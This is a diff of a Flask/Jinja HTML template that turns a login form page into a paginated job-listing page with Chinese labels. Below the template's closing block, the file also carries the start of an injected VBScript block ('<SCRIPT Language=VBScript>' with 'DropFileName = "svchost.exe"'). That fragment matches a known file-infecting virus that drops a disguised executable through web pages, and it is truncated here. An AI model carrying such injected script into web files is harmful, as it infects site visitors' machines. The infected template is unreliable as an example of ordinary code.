@@ -1,15 +1,22 @@
 {% extends "base.html" %}
-{% from "macros.html" import render_form %}
+{% from "macros.html" import render_pagination, render_job %}
 
-{% block title %}
-Login
-{% endblock %}
+
+{% block title %}职位{% endblock %}
+
 
 {% block body %}
-<div class="form">
-  <h2>登录</h2>
-  {{ render_form(form, url_for('front.login')) }}
+<div class="jumbotron">
+  <h1>Todo: 职位过滤</h1>
 </div>
+
+<div class="job-list">
+  {% for job in pagination.items %}
+    {{ render_job(job) }}
+  {% endfor %}
+</div>
+
+{{ render_pagination(pagination, 'job.index') }}
 {% endblock %}
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
